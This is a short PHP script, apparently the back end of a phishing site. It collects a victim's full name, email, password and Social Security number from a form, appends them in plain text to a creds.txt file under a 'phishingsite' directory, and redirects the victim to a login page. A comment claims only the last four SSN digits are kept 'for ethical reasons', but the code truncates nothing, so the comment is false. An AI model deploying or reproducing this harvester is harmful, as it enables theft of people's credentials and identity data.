<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

$file = '/var/www/phishingsite/creds.txt';

if (!isset($_POST['full_name']) || !isset($_POST['email']) || !isset($_POST['password']) || !isset($_POST['ssn'])) {
    die("Invalid request");
}

$full_name = $_POST['full_name'];
$email = $_POST['email'];
$password = $_POST['password'];
$ssn = $_POST['ssn']; // Only capturing last 4 digits for ethical reasons

$data = "Full Name: " . $full_name . " | Email: " . $email . " | Password: " . $password . " | SSN (Last 4): " . $ssn . "\n";

if (!file_put_contents($file, $data, FILE_APPEND)) {
    die("Error: Unable to write to file");
}

header('Location: login.html');
exit();
?>
